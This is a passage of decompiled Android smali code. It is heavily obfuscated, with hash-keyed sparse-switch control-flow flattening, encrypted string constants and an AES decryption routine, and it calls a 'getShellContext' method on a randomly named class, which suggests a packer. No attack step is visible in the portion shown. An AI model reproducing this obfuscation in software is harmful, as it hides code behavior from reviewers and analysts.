        -0x3f8ac93 -> :sswitch_33
        0x871c34f -> :sswitch_34
    .end sparse-switch

    :sswitch_data_10
    .sparse-switch
        -0x7548aea4 -> :sswitch_3e
        -0x192478e5 -> :sswitch_3f
        0x35be599e -> :sswitch_3a
        0x6d539f61 -> :sswitch_38
    .end sparse-switch

    :sswitch_data_11
    .sparse-switch
        -0x3e4d020f -> :sswitch_3d
        -0x139b740b -> :sswitch_3c
        0x5f5e06be -> :sswitch_39
        0x5f76daa4 -> :sswitch_3b
    .end sparse-switch

    :sswitch_data_12
    .sparse-switch
        -0x7d812bf1 -> :sswitch_48
        -0x2c95c502 -> :sswitch_4c
        0x2cfca3c1 -> :sswitch_40
        0x7f0a0a25 -> :sswitch_4d
    .end sparse-switch

    :sswitch_data_13
    .sparse-switch
        -0x21d624a9 -> :sswitch_41
        0x6a10d6d -> :sswitch_10e
        0x392929fc -> :sswitch_145
        0x7a0976d6 -> :sswitch_10a
    .end sparse-switch

    :sswitch_data_14
    .sparse-switch
        -0x1700f6d7 -> :sswitch_110
        0x77e3bd6 -> :sswitch_11b
        0x2abd6909 -> :sswitch_42
        0x72c284dc -> :sswitch_114
    .end sparse-switch

    :sswitch_data_15
    .sparse-switch
        -0x7932e32b -> :sswitch_44
        -0x6d4f7441 -> :sswitch_11a
        -0x5420dcb2 -> :sswitch_43
        0x30d4fbeb -> :sswitch_116
    .end sparse-switch

    :sswitch_data_16
    .sparse-switch
        -0x508960cf -> :sswitch_143
        -0x996f1ef -> :sswitch_45
        0x13cc9160 -> :sswitch_144
        0x1ba43f31 -> :sswitch_146
    .end sparse-switch

    :sswitch_data_17
    .sparse-switch
        -0x5e56fe53 -> :sswitch_141
        -0xd89785a -> :sswitch_140
        0x1deea68e -> :sswitch_142
        0x752c966c -> :sswitch_46
    .end sparse-switch

    :sswitch_data_18
    .sparse-switch
        -0x66e03fa4 -> :sswitch_47
        -0x1ab63c76 -> :sswitch_4a
        0x1fd2941 -> :sswitch_49
        0x7770a0ce -> :sswitch_4b
    .end sparse-switch

    :sswitch_data_19
    .sparse-switch
        -0x62d5ad72 -> :sswitch_5c
        0x163e909b -> :sswitch_5b
        0x3ac4dba5 -> :sswitch_57
        0x47dbcec3 -> :sswitch_53
    .end sparse-switch

    :sswitch_data_1a
    .sparse-switch
        -0xae59be2 -> :sswitch_61
        0x498af44 -> :sswitch_60
        0x10acfe44 -> :sswitch_54
        0x41eaf5d0 -> :sswitch_63
    .end sparse-switch

    :sswitch_data_1b
    .sparse-switch
        -0x7c73479d -> :sswitch_5d
        -0x5c2b4de9 -> :sswitch_55
        0x41ef0322 -> :sswitch_5e
        0x7f548533 -> :sswitch_5f
    .end sparse-switch

    :sswitch_data_1c
    .sparse-switch
        -0x2600d021 -> :sswitch_58
        0x5511b4c1 -> :sswitch_56
        0x769f8ea8 -> :sswitch_59
        0x7b837cce -> :sswitch_5a
    .end sparse-switch

    :sswitch_data_1d
    .sparse-switch
        -0x7f24537a -> :sswitch_69
        -0x24936a0 -> :sswitch_64
        0x392413f2 -> :sswitch_6a
        0x58b013d9 -> :sswitch_6e
    .end sparse-switch

    :sswitch_data_1e
    .sparse-switch
        -0x5e05a4d9 -> :sswitch_66
        -0x1df5e4e1 -> :sswitch_67
        -0x11c28a3b -> :sswitch_68
        0x1a1d003e -> :sswitch_65
    .end sparse-switch

    :sswitch_data_1f
    .sparse-switch
        -0x6172f5ab -> :sswitch_6b
        -0x25373431 -> :sswitch_74
        -0x19c7ae4e -> :sswitch_70
        0x36fdff24 -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_20
    .sparse-switch
        -0x27e4b551 -> :sswitch_79
        -0x1b4de015 -> :sswitch_6c
        0x5d158522 -> :sswitch_78
        0x607792c7 -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_21
    .sparse-switch
        -0x3a0e7dd4 -> :sswitch_6d
        0xfcd0809 -> :sswitch_76
        0x5d73040b -> :sswitch_75
        0x78897271 -> :sswitch_77
    .end sparse-switch

    :sswitch_data_22
    .sparse-switch
        -0x704abb58 -> :sswitch_6f
        -0x5ca08acd -> :sswitch_72
        -0x5a0fcf15 -> :sswitch_71
        -0x2c4c63aa -> :sswitch_73
    .end sparse-switch

    :sswitch_data_23
    .sparse-switch
        -0x59b5ea40 -> :sswitch_7b
        -0x575e352c -> :sswitch_7a
        -0xe43881c -> :sswitch_84
        0x4016fb95 -> :sswitch_80
    .end sparse-switch

    :sswitch_data_24
    .sparse-switch
        -0x61e89b03 -> :sswitch_8b
        -0x37df80e7 -> :sswitch_8a
        0x832ad81 -> :sswitch_86
        0x1fe05627 -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_25
    .sparse-switch
        -0x4366ed89 -> :sswitch_d0
        -0x25a8f1a5 -> :sswitch_7c
        -0x23f9f166 -> :sswitch_d4
        0x6cf0e5f3 -> :sswitch_e8
    .end sparse-switch

    :sswitch_data_26
    .sparse-switch
        -0x58e4f0a2 -> :sswitch_7d
        -0x92e8939 -> :sswitch_da
        0x1b595b7d -> :sswitch_d6
        0x342c50d4 -> :sswitch_e8
    .end sparse-switch

    :sswitch_data_27
    .sparse-switch
        -0x4ca4a26b -> :sswitch_dc
        -0x3235db54 -> :sswitch_7e
        -0x4b4958e -> :sswitch_e8
        0x38c7e0af -> :sswitch_e0
    .end sparse-switch

    :sswitch_data_28
    .sparse-switch
        -0x4caa5de8 -> :sswitch_81
        -0x1b0dc55b -> :sswitch_82
        0xef3091f -> :sswitch_83
        0x2d8b2a80 -> :sswitch_7f
    .end sparse-switch

    :sswitch_data_29
    .sparse-switch
        -0x7a84511c -> :sswitch_88
        -0x21fcfccd -> :sswitch_87
        0x12a4e5ae -> :sswitch_85
        0x1c13beac -> :sswitch_89
    .end sparse-switch

    :sswitch_data_2a
    .sparse-switch
        -0x6a49a224 -> :sswitch_92
        0x25e461c -> :sswitch_8c
        0x4829341f -> :sswitch_93
        0x4df389a2 -> :sswitch_8e
    .end sparse-switch

    :sswitch_data_2b
    .sparse-switch
        -0x6e31e0f3 -> :sswitch_8f
        -0x239d6544 -> :sswitch_91
        0x4a98eb2c -> :sswitch_90
        0x7ff52dd8 -> :sswitch_8d
    .end sparse-switch

    :sswitch_data_2c
    .sparse-switch
        -0x7bddd02a -> :sswitch_a1
        -0x773fee41 -> :sswitch_94
        0x105a2391 -> :sswitch_97
        0x275ce8c1 -> :sswitch_9b
    .end sparse-switch

    :sswitch_data_2d
    .sparse-switch
        -0x2b04bad4 -> :sswitch_af
        0x504540f3 -> :sswitch_95
        0x707b6322 -> :sswitch_9d
        0x7656c389 -> :sswitch_a1
    .end sparse-switch

    :sswitch_data_2e
    .sparse-switch
        -0x2579e026 -> :sswitch_9a
        0x1cb393fd -> :sswitch_99
        0x6b647d20 -> :sswitch_96
        0x6fdeb2c6 -> :sswitch_98
    .end sparse-switch

    :sswitch_data_2f
    .sparse-switch
        -0x69276d8b -> :sswitch_9c
        -0x5c242697 -> :sswitch_9e
        -0x318dd326 -> :sswitch_9f
        0x2595ca7a -> :sswitch_a0
    .end sparse-switch

    :sswitch_data_30
    .sparse-switch
        -0x631af6a9 -> :sswitch_a7
        -0x36a4f0f5 -> :sswitch_8c
        0x25ec2bac -> :sswitch_a2
        0x6966b2c2 -> :sswitch_a8
    .end sparse-switch

    :sswitch_data_31
    .sparse-switch
        -0x5b611dca -> :sswitch_a5
        -0x2be48f03 -> :sswitch_a6
        -0x238bd837 -> :sswitch_a3
        0x726d957c -> :sswitch_a4
    .end sparse-switch

    :sswitch_data_32
    .sparse-switch
        -0x7663aadc -> :sswitch_a9
        -0x6b5752cd -> :sswitch_ab
        -0x5696dabb -> :sswitch_af
        -0x21a2d1d5 -> :sswitch_8c
    .end sparse-switch

    :sswitch_data_33
    .sparse-switch
        -0x7a7d31b0 -> :sswitch_ae
        -0x6f453c46 -> :sswitch_ad
        -0x162f1995 -> :sswitch_ac
        0x69c7fc25 -> :sswitch_aa
    .end sparse-switch

    :sswitch_data_34
    .sparse-switch
        -0x56b4284a -> :sswitch_b0
        -0xb4eab2e -> :sswitch_b5
        0x4ac7df94 -> :sswitch_b6
        0x7f779d04 -> :sswitch_ce
    .end sparse-switch

    :sswitch_data_35
    .sparse-switch
        -0x6700f37d -> :sswitch_b2
        0xda7435b -> :sswitch_b3
        0x44b6b2b7 -> :sswitch_b4
        0x608252ca -> :sswitch_b1
    .end sparse-switch

    :sswitch_data_36
    .sparse-switch
        -0x7b68b2a8 -> :sswitch_b7
        -0x7117429e -> :sswitch_bc
        0x4c14e53e -> :sswitch_cd
        0x57e657c8 -> :sswitch_bd
    .end sparse-switch

    :sswitch_data_37
    .sparse-switch
        -0x36d4bc3a -> :sswitch_bb
        -0x1da534e5 -> :sswitch_b9
        0x128c164b -> :sswitch_b8
        0x6b06da61 -> :sswitch_ba
    .end sparse-switch

    :sswitch_data_38
    .sparse-switch
        -0x47d31957 -> :sswitch_c4
        0xbfdd565 -> :sswitch_c3
        0x5f2ed60e -> :sswitch_be
        0x7c21e4fe -> :sswitch_cc
    .end sparse-switch

    :sswitch_data_39
    .sparse-switch
        -0x77106134 -> :sswitch_c1
        -0x1b56eb5e -> :sswitch_c2
        0x4c1b2328 -> :sswitch_c0
        0x55411d78 -> :sswitch_bf
    .end sparse-switch

    :sswitch_data_3a
    .sparse-switch
        -0x3362dba3 -> :sswitch_cb
        0x3cca6aad -> :sswitch_c7
        0x42a00fa5 -> :sswitch_8c
        0x7f43f7b8 -> :sswitch_c5
    .end sparse-switch

    :sswitch_data_3b
    .sparse-switch
        -0x50c3331f -> :sswitch_c9
        -0x4e756cf0 -> :sswitch_ca
        0x95f1c7d -> :sswitch_c8
        0x23f72e37 -> :sswitch_c6
    .end sparse-switch

    :sswitch_data_3c
    .sparse-switch
        -0x5949cf2c -> :sswitch_d2
        -0x1b07e442 -> :sswitch_d1
        0x3fcf3725 -> :sswitch_d3
        0x68fb4c11 -> :sswitch_cf
    .end sparse-switch

    :sswitch_data_3d
    .sparse-switch
        -0x5f4941a4 -> :sswitch_d5
        -0x8fd4499 -> :sswitch_d7
        -0x2e11d3f -> :sswitch_d8
        0x2da3c35d -> :sswitch_d9
    .end sparse-switch

    :sswitch_data_3e
    .sparse-switch
        -0x756e79a3 -> :sswitch_df
        -0x152704d0 -> :sswitch_db
        0xe3f83f -> :sswitch_dd
        0x49ad5b9f -> :sswitch_de
    .end sparse-switch

    :sswitch_data_3f
    .sparse-switch
        -0x5072eb78 -> :sswitch_e1
        -0x49866c02 -> :sswitch_e6
        -0x12b6da43 -> :sswitch_e7
        0x31dfab1 -> :sswitch_eb
    .end sparse-switch

    :sswitch_data_40
    .sparse-switch
        -0x67d43b79 -> :sswitch_e5
        -0x6595429c -> :sswitch_e2
        0x2df34527 -> :sswitch_e4
        0x67a732ad -> :sswitch_e3
    .end sparse-switch

    :sswitch_data_41
    .sparse-switch
        -0x552d1a97 -> :sswitch_f1
        -0x2b155530 -> :sswitch_ed
        0xd00564e -> :sswitch_f2
        0x402d9d5e -> :sswitch_e9
    .end sparse-switch

    :sswitch_data_42
    .sparse-switch
        -0x6be31101 -> :sswitch_f4
        -0x3c3c1096 -> :sswitch_62
        0x2014662b -> :sswitch_f8
        0x3f8275d6 -> :sswitch_ea
    .end sparse-switch

    :sswitch_data_43
    .sparse-switch
        -0x36b2a7a2 -> :sswitch_f0
        -0x207cf72a -> :sswitch_ee
        -0x165f2798 -> :sswitch_ec
        0x58bc5131 -> :sswitch_ef
    .end sparse-switch

    :sswitch_data_44
    .sparse-switch
        -0x4581330d -> :sswitch_f3
        -0x2416808d -> :sswitch_f6
        0x2ae0547b -> :sswitch_f7
        0x393cf3aa -> :sswitch_f5
    .end sparse-switch

    :sswitch_data_45
    .sparse-switch
        -0x6f49d12c -> :sswitch_f9
        -0x32b33008 -> :sswitch_fc
        0x2807b6e2 -> :sswitch_fa
        0x3ee1ef74 -> :sswitch_100
    .end sparse-switch

    :sswitch_data_46
    .sparse-switch
        -0x4c6f7f61 -> :sswitch_107
        -0x317ac577 -> :sswitch_102
        -0x18c4a4bb -> :sswitch_106
        0x32e93f14 -> :sswitch_fa
    .end sparse-switch

    :sswitch_data_47
    .sparse-switch
        -0x100df14a -> :sswitch_fb
        -0x5e232fb -> :sswitch_fe
        0x4221afa -> :sswitch_fd
        0x61c1376f -> :sswitch_ff
    .end sparse-switch

    :sswitch_data_48
    .sparse-switch
        -0x64e9d3a6 -> :sswitch_101
        -0x5b81fee3 -> :sswitch_105
        -0xe2d6773 -> :sswitch_104
        0x67fba741 -> :sswitch_103
    .end sparse-switch

    :sswitch_data_49
    .sparse-switch
        -0x555a6494 -> :sswitch_10d
        -0x44813464 -> :sswitch_10b
        0x709357f6 -> :sswitch_10c
        0x71092e4b -> :sswitch_109
    .end sparse-switch

    :sswitch_data_4a
    .sparse-switch
        -0x2cc19137 -> :sswitch_112
        -0x125ea26b -> :sswitch_111
        0x14ddd8bd -> :sswitch_113
        0x51daddb4 -> :sswitch_10f
    .end sparse-switch

    :sswitch_data_4b
    .sparse-switch
        -0x1eea1922 -> :sswitch_119
        0x1d244116 -> :sswitch_118
        0x1deb9bd4 -> :sswitch_115
        0x7d1ab3dd -> :sswitch_117
    .end sparse-switch

    :sswitch_data_4c
    .sparse-switch
        -0x66517958 -> :sswitch_123
        0x288b292c -> :sswitch_44
        0x2df0de72 -> :sswitch_11f
        0x58f30875 -> :sswitch_11c
    .end sparse-switch

    :sswitch_data_4d
    .sparse-switch
        -0x367b6c69 -> :sswitch_125
        -0x35acd768 -> :sswitch_130
        -0x10b55fb7 -> :sswitch_129
        0x7be8b30f -> :sswitch_11d
    .end sparse-switch

    :sswitch_data_4e
    .sparse-switch
        -0x2bc580cc -> :sswitch_120
        -0x1416bba2 -> :sswitch_121
        0x2f84517c -> :sswitch_122
        0x721a23c9 -> :sswitch_11e
    .end sparse-switch

    :sswitch_data_4f
    .sparse-switch
        -0x713a4320 -> :sswitch_128
        -0x24d1e2ab -> :sswitch_126
        0x4d1ea44b -> :sswitch_124
        0x5b895223 -> :sswitch_127
    .end sparse-switch

    :sswitch_data_50
    .sparse-switch
        -0x75b24cfa -> :sswitch_130
        -0x497270e6 -> :sswitch_12f
        -0x41b8cfd1 -> :sswitch_12a
        0x4dcf2535 -> :sswitch_13f
    .end sparse-switch

    :sswitch_data_51
    .sparse-switch
        -0x69bbc02a -> :sswitch_12c
        -0xaf2f615 -> :sswitch_12e
        0x44578d4c -> :sswitch_12b
        0x68060bf8 -> :sswitch_12d
    .end sparse-switch

    :sswitch_data_52
    .sparse-switch
        -0x649870d3 -> :sswitch_137
        -0x333e6993 -> :sswitch_13f
        -0xf58e86d -> :sswitch_131
        0x9912b96 -> :sswitch_133
    .end sparse-switch

    :sswitch_data_53
    .sparse-switch
        -0x5b69dc01 -> :sswitch_136
        0x3884bed -> :sswitch_132
        0x16d34257 -> :sswitch_134
        0x31aa2019 -> :sswitch_135
    .end sparse-switch

    :sswitch_data_54
    .sparse-switch
        0x565b6a6 -> :sswitch_62
        0x398fe9ae -> :sswitch_13e
        0x5fb76375 -> :sswitch_138
        0x6dbe745f -> :sswitch_13d
    .end sparse-switch

    :sswitch_data_55
    .sparse-switch
        -0x590b1081 -> :sswitch_13a
        0x15fede86 -> :sswitch_13b
        0x3b75d10c -> :sswitch_139
        0x44bd4e7c -> :sswitch_13c
    .end sparse-switch
.end method

.method public static decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 14
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    const/4 v13, 0x2

    const/16 v12, 0x10

    const/4 v7, 0x0

    const/4 v2, 0x0

    const-string v0, "\u06d7\u06d6\u06e0\u06db\u06e0\u06d6\u06d8\u06d9\u06e2\u06e2\u06da\u06e1\u06d7\u06e5\u06e6\u06e6\u06d8\u06db\u06dc\u06e4\u06d9\u06e7\u06e8\u06d8\u06db\u06e6\u06d8\u06d8\u06d9\u06e7\u06d6\u06d8\u06ec\u06e5\u06d6\u06df\u06e4\u06e4\u06e1\u06d6\u06e8\u06e6\u06e7\u06da\u06e8\u06d7\u06e6"

    move-object v1, v2

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    move v6, v7

    move-object v8, v2

    move-object v9, v2

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    const/16 v10, 0x1d2

    xor-int/2addr v2, v10

    xor-int/lit16 v2, v2, 0x278

    const/16 v10, 0x375

    const v11, 0x46c36bc0    # 25013.875f

    xor-int/2addr v2, v10

    xor-int/2addr v2, v11

    sparse-switch v2, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const-string v0, "\u06eb\u06d9\u06da\u06e7\u06e8\u06dc\u06d8\u06d8\u06e6\u06d8\u06d9\u06e7\u06d9\u06dc\u06e2\u06da\u06d9\u06e2\u06e0\u06d7\u06e6\u06e5\u06e2\u06e0\u06d8\u06d8\u06e4\u06db\u06e8\u06d8\u06e6\u06e2\u06dc\u06d8\u06eb\u06dc\u06e8\u06d8\u06dc\u06e8\u06e6\u06d8\u06da\u06e6\u06db\u06e7\u06e6\u06e8\u06d8\u06dc\u06e7\u06e0\u06e6\u06e8\u06d9\u06d6\u06e0\u06df\u06eb\u06e2\u06e2"

    goto :goto_0

    :sswitch_1
    const-string v0, "\u06ec\u06da\u06e6\u06d8\u06db\u06d6\u06e8\u06e0\u06e5\u06e1\u06d6\u06d7\u06e7\u06e2\u06db\u06e8\u06d8\u06da\u06d9\u06dc\u06d8\u06d6\u06db\u06e0\u06ec\u06ec\u06da\u06d6\u06db\u06d7\u06eb\u06ec\u06d7\u06e1\u06e4\u06db\u06e4"

    goto :goto_0

    :sswitch_2
    invoke-static {p0, v13}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v2

    const-string v0, "\u06dc\u06df\u06e8\u06ec\u06e5\u06e5\u06d8\u06d9\u06db\u06dc\u06d8\u06df\u06e4\u06df\u06e6\u06df\u06d6\u06e4\u06e8\u06d8\u06d8\u06e1\u06dc\u06d7\u06db\u06e6\u06e4\u06db\u06e0\u06e7\u06e8\u06e6\u06eb\u06d9\u06d8\u06e5\u06d8\u06e1\u06db\u06da\u06db\u06e1\u06e8\u06d8\u06db\u06e6\u06e1\u06e2\u06db\u06ec\u06dc\u06d7\u06d8"

    move-object v9, v2

    goto :goto_0

    :sswitch_3
    new-array v2, v12, [B

    const-string v0, "\u06e0\u06e8\u06e8\u06d8\u06d7\u06e0\u06da\u06e0\u06e7\u06d6\u06d8\u06d6\u06d6\u06d9\u06eb\u06e1\u06d8\u06d8\u06e8\u06e2\u06e1\u06eb\u06e4\u06e1\u06db\u06d8\u06e7\u06d8\u06ec\u06d9\u06d8\u06d8\u06e5\u06d9\u06e0"

    move-object v8, v2

    goto :goto_0

    :sswitch_4
    invoke-static {v9, v7, v8, v7, v12}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    const-string v0, "\u06e0\u06e0\u06e5\u06d8\u06e6\u06e0\u06e8\u06d9\u06d8\u06dc\u06db\u06dc\u06e1\u06db\u06d9\u06d7\u06eb\u06e8\u06e5\u06eb\u06ec\u06e7\u06dc\u06e5\u06e7\u06ec\u06da\u06d8\u06da\u06e0\u06dc\u06d8\u06da\u06d7\u06e1\u06ec\u06d7\u06d9"

    goto :goto_0

    :sswitch_5
    array-length v0, v9

    add-int/lit8 v2, v0, -0x10

    const-string v0, "\u06d8\u06e0\u06d7\u06da\u06df\u06e4\u06e5\u06ec\u06dc\u06d8\u06db\u06d6\u06d9\u06ec\u06e5\u06e4\u06e2\u06e6\u06dc\u06d8\u06e0\u06d6\u06eb\u06d9\u06e1\u06d8\u06e2\u06e5\u06d7\u06d8\u06d9\u06e8\u06eb\u06da\u06e8\u06d8\u06d9\u06dc\u06df\u06e6\u06e0\u06e7\u06e5\u06e8\u06e5\u06d8\u06e8\u06dc\u06e8\u06d8\u06dc\u06db\u06eb"

    move v6, v2

    goto :goto_0

    :sswitch_6
    new-array v2, v6, [B

    const-string v0, "\u06e6\u06d7\u06e4\u06d8\u06eb\u06e0\u06d7\u06eb\u06e1\u06d8\u06e1\u06e5\u06d7\u06e1\u06e4\u06ec\u06e1\u06e7\u06dc\u06d8\u06d7\u06ec\u06d6\u06ec\u06dc\u06d7\u06d7\u06e5\u06e1\u06d8\u06d9\u06e7\u06e1\u06d8\u06d9\u06e8\u06df\u06ec\u06dc\u06e5\u06e7\u06e5\u06dc\u06df\u06e6\u06e2\u06e1\u06e8\u06d8\u06d8\u06e7\u06e6\u06e6\u06d8\u06d9\u06d6\u06eb\u06df\u06d6\u06db"

    move-object v5, v2

    goto :goto_0

    :sswitch_7
    invoke-static {v9, v12, v5, v7, v6}, Ljava/lang/System;->arraycopy(Ljava/lang/Object;ILjava/lang/Object;II)V

    const-string v0, "\u06eb\u06d8\u06d6\u06d8\u06e2\u06da\u06e2\u06d7\u06e0\u06e0\u06da\u06eb\u06e6\u06e7\u06ec\u06e8\u06e4\u06dc\u06e8\u06e6\u06d8\u06e2\u06e1\u06d7\u06eb\u06e4\u06df\u06d8\u06e1\u06e8\u06dc\u06ec\u06e5\u06e2\u06e7\u06d6\u06d8\u06e8\u06dc\u06df\u06d7\u06e5\u06e8\u06d8\u06e8\u06df\u06e6\u06db\u06dc"

    goto :goto_0

    :sswitch_8
    new-instance v2, Ljavax/crypto/spec/IvParameterSpec;

    invoke-direct {v2, v8}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    const-string v0, "\u06eb\u06d7\u06db\u06e1\u06e1\u06da\u06e4\u06e2\u06e8\u06e1\u06e5\u06da\u06d8\u06da\u06e4\u06e1\u06d6\u06e4\u06e2\u06eb\u06d7\u06df\u06d8\u06eb\u06ec\u06dc\u06db\u06e7\u06e5\u06d6"

    move-object v4, v2

    goto :goto_0

    :sswitch_9
    new-instance v2, Ljavax/crypto/spec/SecretKeySpec;

    const-string v0, "Ph0wUQA=\n"

    const-string v3, "a0l2fDjbPJQ=\n"

    invoke-static {v0, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    const-string v3, "O/V9\n"

    const-string v10, "erAuBO8RUWA=\n"

    invoke-static {v3, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v0, v3}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    const-string v0, "\u06e0\u06db\u06dc\u06d6\u06df\u06eb\u06dc\u06d7\u06e2\u06e5\u06db\u06d9\u06da\u06d9\u06e1\u06d8\u06da\u06d7\u06e8\u06e2\u06ec\u06eb\u06d6\u06d7\u06e5\u06d8\u06e1\u06e0\u06e4\u06e0\u06e7\u06e1"

    move-object v3, v2

    goto :goto_0

    :sswitch_a
    const-string v0, "FOa32p41OqkF6Kem6CcY4jHKipI=\n"

    const-string v1, "VaPk9d13eYY=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v1

    const-string v0, "\u06eb\u06e2\u06ec\u06d6\u06df\u06e0\u06e4\u06da\u06db\u06e0\u06ec\u06df\u06db\u06e2\u06df\u06d9\u06e1\u06e6\u06e1\u06d7\u06e4\u06e5\u06dc\u06e5\u06db\u06d9\u06d6\u06da\u06d9\u06db\u06d6\u06e7\u06ec\u06e5\u06d6\u06e4\u06db\u06d9\u06dc\u06d8\u06e5\u06d8\u06d6"

    goto :goto_0

    :sswitch_b
    invoke-virtual {v1, v13, v3, v4}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    const-string v0, "\u06e8\u06df\u06d8\u06ec\u06e4\u06eb\u06e2\u06df\u06e5\u06d8\u06d6\u06e5\u06d9\u06db\u06e6\u06da\u06d9\u06ec\u06d6\u06e2\u06eb\u06da\u06e6\u06e5\u06e7\u06d8\u06d8\u06e7\u06da\u06eb\u06e1\u06e2\u06e6\u06d6\u06da\u06e4\u06ec\u06d7\u06e8\u06e5\u06dc\u06d6\u06da\u06e7\u06db\u06d9\u06e1\u06ec\u06db"

    goto :goto_0

    :sswitch_c
    new-instance v0, Ljava/lang/String;

    invoke-virtual {v1, v5}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object v1

    const-string v2, "9EW7qLM=\n"

    const-string v3, "oRH9hYspF9M=\n"

    invoke-static {v2, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    return-object v0

    :sswitch_data_0
    .sparse-switch
        -0x74a902c4 -> :sswitch_4
        -0x4e00ee24 -> :sswitch_c
        -0x397202b5 -> :sswitch_6
        -0xbfd824b -> :sswitch_2
        -0x671966b -> :sswitch_8
        0x2c9aed45 -> :sswitch_3
        0x2cc898ca -> :sswitch_9
        0x3bcc66fa -> :sswitch_0
        0x5d949762 -> :sswitch_7
        0x615b49cd -> :sswitch_a
        0x66dd086e -> :sswitch_1
        0x6a0be828 -> :sswitch_b
        0x7c5593ce -> :sswitch_5
    .end sparse-switch
.end method

.method public static getJsonResult()Lorg/json/JSONObject;
    .locals 4

    const-string v0, "\u06e1\u06e2\u06e4\u06e0\u06e7\u06e8\u06d8\u06ec\u06e2\u06e7\u06df\u06e0\u06e8\u06d8\u06db\u06d6\u06e5\u06d8\u06e0\u06e5\u06d8\u06d8\u06e0\u06e6\u06e2\u06df\u06e2\u06e5\u06eb\u06db\u06d8\u06df\u06d8\u06d6\u06d8"

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0x2a4

    xor-int/2addr v1, v2

    xor-int/lit16 v1, v1, 0x259

    const/16 v2, 0x1f5

    const v3, -0x1d90fbe2

    xor-int/2addr v1, v2

    xor-int/2addr v1, v3

    sparse-switch v1, :sswitch_data_0

    goto :goto_0

    :sswitch_0
    const v1, 0x6e669d41

    const-string v0, "\u06e6\u06eb\u06e7\u06e5\u06e4\u06ec\u06dc\u06d7\u06e6\u06e8\u06ec\u06e5\u06d8\u06d6\u06e5\u06d8\u06db\u06e7\u06da\u06d9\u06e2\u06da\u06d6\u06e7\u06e6\u06eb\u06d7\u06e1\u06dc\u06ec\u06e5\u06d8\u06d9\u06d8\u06e2\u06d7\u06e4\u06d7\u06d6\u06d8\u06e8\u06d8\u06e8\u06e7\u06d7\u06d8\u06d8\u06e0\u06df\u06e2"

    :goto_1
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_1

    goto :goto_1

    :sswitch_1
    const-string v0, "\u06eb\u06ec\u06eb\u06d6\u06e5\u06df\u06d9\u06da\u06e1\u06d8\u06d6\u06d8\u06ec\u06ec\u06d9\u06e8\u06d8\u06eb\u06e5\u06e5\u06d8\u06eb\u06eb\u06da\u06e4\u06d8\u06eb\u06d6\u06e6\u06dc\u06d8\u06e1\u06e4\u06e0\u06e2\u06eb\u06d6\u06d7\u06e2\u06e7\u06d7\u06e4\u06e4\u06dc\u06d6\u06da\u06df\u06ec\u06e1\u06df\u06e1\u06d6"

    goto :goto_0

    :sswitch_2
    const-string v0, "\u06e1\u06df\u06d8\u06dc\u06da\u06df\u06df\u06e1\u06db\u06e1\u06e6\u06d8\u06e0\u06e8\u06d9\u06e1\u06e0\u06df\u06dc\u06d9\u06d9\u06e1\u06d9\u06d8\u06da\u06ec\u06db\u06ec\u06df\u06e6\u06dc\u06e4\u06e8\u06d9\u06eb\u06df\u06df\u06e7\u06da\u06e1\u06db\u06e8\u06e4\u06d7\u06d6\u06d8\u06eb\u06e6\u06e7"

    goto :goto_1

    :sswitch_3
    const v2, 0x69130f1

    const-string v0, "\u06dc\u06e6\u06e2\u06db\u06e8\u06d6\u06e7\u06db\u06eb\u06e4\u06da\u06e8\u06d6\u06d9\u06d7\u06eb\u06e4\u06db\u06e8\u06e5\u06e6\u06ec\u06d9\u06d6\u06d8\u06e0\u06d8\u06e8\u06e6\u06d7\u06d6\u06d8\u06e5\u06d6\u06d8\u06d8\u06e1\u06e6\u06d8\u06eb\u06e8\u06e8\u06d9\u06dc\u06d6"

    :goto_2
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2

    goto :goto_2

    :sswitch_4
    invoke-static {}, Lcom/zyyad/gamf/UgxfpdsWPJtvNIp;->getShellContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lapi/repository/Utils;->isRequest(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u06d8\u06e2\u06d8\u06e6\u06ec\u06ec\u06d9\u06d6\u06eb\u06d6\u06e8\u06e5\u06d8\u06ec\u06d6\u06e8\u06d8\u06e0\u06ec\u06db\u06e2\u06d8\u06d6\u06d8\u06db\u06e4\u06db\u06d9\u06e7\u06d9\u06e2\u06e5\u06d9\u06e8\u06e2\u06db\u06d7\u06e1\u06e7"

    goto :goto_2

    :cond_0
